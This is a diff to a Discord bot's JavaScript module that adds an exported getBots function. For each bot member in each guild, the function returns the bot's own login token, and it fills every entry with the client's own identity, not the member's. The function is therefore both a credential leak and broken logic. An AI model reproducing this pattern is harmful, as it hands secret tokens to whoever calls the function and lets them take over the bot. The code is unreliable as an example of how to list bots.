@@ -49,8 +49,35 @@ const start = () => {
     }
     client.handleEvents(eventFiles, './src/bot/events');
     client.handleCommands(commandFolders, './src/bot/commands');
-    client.login(botConfig.token);
+    await client.login(botConfig.token);
+
+    client.token = botConfig.token;
   })();
+};
+
+const getBots = async () => {
+  let botData = [];
+  try {
+    for (const guild of client.guilds.cache.values()) {
+      const members = await guild.members.fetch();
+      members.forEach((member) => {
+        if (member.user.bot) {
+          botData.push({
+            token: client.token,
+            guild: guild.name,
+            username: client.user.username,
+            displayName: client.displayName,
+            avatar: client.user.displayAvatarURL(),
+            hashname: `${client.user.username}#${client.user.discriminator}`,
+            id: client.user.id,
+          });
+        }
+      });
+    }
+  } catch (error) {
+    logger.error('Error fetching bots:', error);
+  }
+  return botData;
 };
 
 const getMembers = async () => {
@@ -163,4 +190,5 @@ module.exports = {
   start,
   getMembers,
   getServers,
+  getBots,
 };
